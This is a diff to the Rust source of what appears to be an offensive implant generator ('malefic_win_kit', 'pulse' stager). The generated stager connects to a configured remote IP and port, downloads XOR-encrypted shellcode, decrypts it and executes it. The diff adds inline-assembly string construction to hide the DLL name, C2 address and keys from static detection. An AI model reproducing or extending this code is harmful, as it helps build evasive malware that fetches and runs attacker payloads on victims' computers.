@@ -1,6 +1,6 @@
 use crate::{GenerateArch, PulseConfig, Version};
 
-use super::{djb2_hash, utils::{TARGET_SOURCE_PATH, X64_MAIN_TEMPLATE_PATH, X64_MAKE_BODY, X86_MAIN_TEMPLATE_PATH, X86_MAKE_BODY}, PANIC};
+use super::{djb2_hash, utils::{TARGET_SOURCE_PATH, X64_MAIN_TEMPLATE_PATH, X64_MAKE_BODY, X86_MAIN_TEMPLATE_PATH, X86_MAKE_BODY, generate_string_asm_instructions, generate_dll_name_asm}, PANIC};
 
 static X64_DEPENDENCIES: &str = "
 use malefic_win_kit::asm::arch::x64::{
@@ -187,6 +187,12 @@ fn make_source_code(
     let key = &config.key;
     let iv = key.chars().rev().collect::<String>();
 
+    let ip_with_null = format!("{}\0", ip);
+    let ip_asm_instructions = generate_string_asm_instructions(&ip_with_null, "ip");
+    let key_asm_instructions = generate_string_asm_instructions(key, "k1");
+    let iv_asm_instructions = generate_string_asm_instructions(&iv, "k2");
+    let dll_asm_instructions = generate_dll_name_asm();
+
     let main_content = format!(
         r#"
 #[no_mangle]
@@ -196,15 +202,40 @@ fn fire() {{
     let magic = {magic}u32;
     let header = b"{http_header}";
     unsafe {{
-        let mut buf: [u8;0x100] = 
+        let mut buf: [u8;0x100] =
             core::mem::MaybeUninit::uninit().assume_init();
-        let mut body_buf: [u8;10] = 
+        let mut body_buf: [u8;10] =
             core::mem::MaybeUninit::uninit().assume_init();
         _memset(buf.as_mut_ptr(), 0, 0x100);
         _memset(body_buf.as_mut_ptr(), 0, 10);
+
+        // Use inline assembly to construct strings - compiler cannot optimize this
+        let mut dll_name = [0u8; 11];
+        let mut target_ip = [0u8; {ip_len}];
+        let mut key1 = [0u8; {key_len}];
+        let mut key2 = [0u8; {iv_len}];
+
+        core::arch::asm!(
+            // Construct "ws2_32.dll\0"
+            {dll_asm_instructions}
+
+            // Construct IP address with null terminator
+            {ip_asm_instructions}
+
+            // Construct encryption keys
+            {key_asm_instructions}
+            {iv_asm_instructions}
+
+            dll = in(reg) dll_name.as_mut_ptr(),
+            ip = in(reg) target_ip.as_mut_ptr(),
+            k1 = in(reg) key1.as_mut_ptr(),
+            k2 = in(reg) key2.as_mut_ptr(),
+            options(nostack, preserves_flags)
+        );
+
         let socket = bind_and_connect(
-            "ws2_32.dll\x00".as_ptr(), 
-            "{ip}\x00".as_ptr(), 
+            dll_name.as_ptr(),
+            target_ip.as_ptr(),
             {port}
         );
         if socket.eq(&0) {{
@@ -215,9 +246,9 @@ fn fire() {{
         xor_process(
             body_buf.as_mut_ptr(),
             10,
-            "{key}".as_ptr(),
+            key1.as_ptr(),
             {key_len},
-            "{iv}".as_ptr(),
+            key2.as_ptr(),
             {iv_len},
             &mut counter
         );
@@ -248,9 +279,9 @@ fn fire() {{
             }}
             offset += ret as usize + 4;
             body_offset = boyer_moore_search(
-                buf.as_mut_ptr(), 
-                0x100, 
-                split_marker.as_ptr(), 
+                buf.as_mut_ptr(),
+                0x100,
+                split_marker.as_ptr(),
                 split_marker.len()
             );
             if body_offset.ne(&-1) {{
@@ -280,9 +311,9 @@ fn fire() {{
         xor_process(
             body_buf.as_mut_ptr(),
             9,
-            "{key}".as_ptr(),
+            key1.as_ptr(),
             {key_len},
-            "{iv}".as_ptr(),
+            key2.as_ptr(),
             {iv_len},
             &mut counter
         );
@@ -323,9 +354,9 @@ fn fire() {{
         xor_process(
             ptr as _,
             shellcode_len as _,
-            "{key}".as_ptr(),
+            key1.as_ptr(),
             {key_len},
-            "{iv}".as_ptr(),
+            key2.as_ptr(),
             {iv_len},
             &mut counter
         );
@@ -337,12 +368,15 @@ fn fire() {{
         end = config.flags.end,
         magic = format!("0x{:x}", magic as u32),
         artifact_id = config.flags.artifact_id,
-        ip = ip,
         port = port[1..].parse::<u16>()?,
-        key = key,
+        ip_len = ip_with_null.len(),
         key_len = key.len(),
-        iv = iv,
         iv_len = iv.len(),
+        http_header = http_header,
+        dll_asm_instructions = dll_asm_instructions,
+        ip_asm_instructions = ip_asm_instructions,
+        key_asm_instructions = key_asm_instructions,
+        iv_asm_instructions = iv_asm_instructions,
     );
     final_data = format!("{}\n\n\n{}", final_data, main_content);
     let target_path = std::path::Path::new(TARGET_SOURCE_PATH);
